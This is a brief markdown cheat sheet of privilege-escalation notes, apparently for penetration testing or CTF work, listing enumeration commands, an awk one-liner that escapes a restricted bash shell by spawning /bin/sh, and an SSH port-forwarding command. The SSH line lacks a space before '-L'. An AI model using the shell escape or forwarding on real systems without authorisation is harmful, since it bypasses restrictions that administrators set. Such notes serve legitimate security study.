# PrivEsc

### Checklist

* Checking sudo : ```sudo -l```
* Checking netstat : ```netstat -laputen```
* Checking process : ```ps -elf```
### Escaping rbash

```awk 'BEGIN {system("/bin/sh")}'```

### SSH Port fowarding 

Service listen on local on port 1234.

```ssh user@remotemachine-L 80:localhost:1234```

Now naviguate to localhost:80

